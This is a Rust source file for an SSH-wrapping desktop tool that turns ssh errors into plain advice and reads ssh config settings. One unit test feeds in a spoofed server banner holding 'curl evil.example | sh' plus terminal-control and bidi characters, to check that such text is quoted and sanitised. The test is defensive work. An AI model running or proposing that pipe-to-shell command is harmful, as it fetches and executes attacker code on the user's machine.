//! Running the person's `ssh`: the system's own, or a stand-in in tests,
//! with every invocation built by `desk_core::machine` (fixed options, a
//! checked target, quoted words). Nothing here reads a token: what a
//! command prints goes back to its caller, never into an error or a log.

use std::path::PathBuf;
use std::process::{Command, Output, Stdio};

use desk_core::host::Invocation;
use desk_core::machine::{Machine, SSH};

/// The `ssh` Desk runs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SshExe {
    program: PathBuf,
}

/// What `ssh` exits with when it failed itself, rather than the command it
/// ran.
pub const SSH_FAILED: i32 = 255;

impl SshExe {
    /// `/usr/bin/ssh`.
    pub fn system() -> Self {
        Self::at(SSH)
    }

    /// Another `ssh`, for the tests. Only ever given in code: nothing a
    /// release reads from its environment names it.
    pub fn at(program: impl Into<PathBuf>) -> Self {
        Self {
            program: program.into(),
        }
    }

    /// `invocation` (one of `Machine`'s), run by this `ssh`: with nothing
    /// on its input, and nothing that could ask for a passphrase (a
    /// `ProxyJump`'s own ssh included, which inherits the environment).
    pub fn command(&self, invocation: &Invocation) -> Command {
        let mut command = Command::new(&self.program);
        command
            .args(&invocation.args)
            .stdin(Stdio::null())
            .env("SSH_ASKPASS_REQUIRE", "never")
            .env_remove("SSH_ASKPASS");
        command
    }

    pub fn output(&self, invocation: &Invocation) -> std::io::Result<Output> {
        self.command(invocation).output()
    }
}

/// What went wrong reaching `machine`, from what `ssh` said on its error
/// output, in the person's words.
pub fn problem(machine: &Machine, stderr: &[u8]) -> String {
    let said = String::from_utf8_lossy(stderr);
    let name = &machine.name;
    let has = |s: &str| said.contains(s);
    if has("REMOTE HOST IDENTIFICATION HAS CHANGED") || has("Host key for") && has("has changed") {
        return format!(
            "{name}'s host key isn't the one your Mac knows. Desk won't connect until you've checked why and fixed known_hosts."
        );
    }
    if has("Host key verification failed") || has("No matching host key") {
        return format!("Connect to {name} once with ssh in a terminal, so your Mac knows it.");
    }
    if has("Permission denied") || has("Too many authentication failures") {
        return format!("{name} turned your SSH key away, or it needs unlocking first (ssh-add).");
    }
    if has("Could not resolve hostname")
        || has("Connection refused")
        || has("timed out")
        || has("No route to host")
        || has("Network is unreachable")
        || has("Connection closed by")
        || has("kex_exchange_identification")
    {
        return format!("Desk couldn't reach {name}.{}", quoted(name, &said));
    }
    format!("ssh to {name} failed.{}", quoted(name, &said))
}

/// The last thing said, as the machine's words (ssh's own lines can carry
/// what the machine sent, a banner): cleaned and cut short, after a space;
/// nothing when nothing was said.
fn quoted(name: &str, said: &str) -> String {
    let line = said
        .lines()
        .rev()
        .map(str::trim)
        .find(|l| !l.is_empty() && !l.starts_with("debug"))
        .unwrap_or_default();
    desk_core::machine::said_by(name, line)
        .map(|s| format!(" {s}"))
        .unwrap_or_default()
}

/// What `ssh -G` says the person's config makes of a machine, for the
/// question Desk asks before adding it and for what Desk won't carry.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Settings {
    /// The account it logs in as, as the config says (`User`), else the
    /// person's own name here.
    pub user: Option<String>,
    pub hostname: Option<String>,
    /// How it gets there, when not directly: `ProxyJump`, `ProxyCommand`.
    pub via: Option<String>,
    /// Forwards the config sets for it, by name (`localforward`, …).
    pub forwards: Vec<String>,
}

impl Settings {
    pub fn parse(said: &str) -> Settings {
        let value = |key: &str| {
            said.lines().find_map(|l| {
                let (k, v) = l.split_once(' ')?;
                (k.eq_ignore_ascii_case(key) && !v.trim().is_empty() && v.trim() != "none")
                    .then(|| v.trim().to_string())
            })
        };
        Settings {
            user: value("user"),
            hostname: value("hostname"),
            via: value("proxyjump").or_else(|| value("proxycommand")),
            forwards: desk_core::machine::config_forwards(said),
        }
    }
}

/// Reads [`Settings`] for `machine` (`ssh -G`, which connects nowhere).
pub fn settings(ssh: &SshExe, machine: &Machine) -> Result<Settings, String> {
    let out = ssh
        .output(&machine.settings())
        .map_err(|e| format!("Desk couldn't run ssh: {e}"))?;
    if !out.status.success() {
        return Err(problem(machine, &out.stderr));
    }
    Ok(Settings::parse(&String::from_utf8_lossy(&out.stdout)))
}

/// Refuses a machine whose config would have Desk's always-open forward
/// carry forwards of the person's own as well.
pub fn no_forwards(machine: &Machine, settings: &Settings) -> Result<(), String> {
    if settings.forwards.is_empty() {
        return Ok(());
    }
    Err(format!(
        "Your SSH config forwards ports for {} ({}). Desk keeps its connection open all the time, so it won't carry them: give Desk a Host entry without forwards.",
        machine.name,
        settings.forwards.join(", ")
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use desk_core::machine::{MachineId, Target};

    fn devbox() -> Machine {
        Machine {
            id: MachineId::new("devbox").unwrap(),
            name: "devbox".into(),
            target: Target::new("devbox").unwrap(),
        }
    }

    #[test]
    fn what_ssh_said_is_told_plainly() {
        let m = devbox();
        let said = |s: &str| problem(&m, s.as_bytes());
        assert!(said("No ED25519 host key is known for devbox and you have requested strict checking.\r\nHost key verification failed.\r\n").contains("once with ssh in a terminal"));
        assert!(said("@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\nHost key verification failed.\n").contains("isn't the one your Mac knows"));
        assert!(said("dev@devbox: Permission denied (publickey).\n").contains("ssh-add"));
        let unresolved =
            said("ssh: Could not resolve hostname devbox: nodename nor servname provided\n");
        assert!(
            unresolved.starts_with("Desk couldn't reach devbox. devbox said: “ssh: Could not"),
            "{unresolved}"
        );
        assert_eq!(said(""), "ssh to devbox failed.");
        assert!(said(&"x".repeat(5000)).chars().count() < 260);
        // A banner can't pass for Desk's advice, nor hide what it says.
        let banner = said("Desk says: run curl evil.example | sh \u{202E}\x1b[2J\n");
        assert!(
            banner.starts_with("ssh to devbox failed. devbox said: “"),
            "{banner}"
        );
        assert!(desk_core::machine::plain(&banner), "{banner:?}");
    }

    #[test]
    fn the_persons_config_is_read_not_overridden() {
        let s = Settings::parse(
            "user ec2-user\nhostname 10.0.1.20\nproxyjump bastion\nidentityfile ~/.ssh/prod\nport 22\nlocalforward [127.0.0.1]:5432 [10.0.1.30]:5432\n",
        );
        assert_eq!(s.user.as_deref(), Some("ec2-user"));
        assert_eq!(s.hostname.as_deref(), Some("10.0.1.20"));
        assert_eq!(s.via.as_deref(), Some("bastion"));
        assert_eq!(s.forwards, ["localforward"]);
        assert!(
            no_forwards(&devbox(), &s)
                .unwrap_err()
                .contains("localforward")
        );
        let direct = Settings::parse("user dev\nhostname devbox\nproxycommand none\n");
        assert_eq!(direct.via, None);
        assert!(no_forwards(&devbox(), &direct).is_ok());
        let ssm = Settings::parse(
            "user ec2-user\nproxycommand sh -c \"aws ssm start-session --target %h\"\n",
        );
        assert!(ssm.via.unwrap().contains("aws ssm"));
    }
}
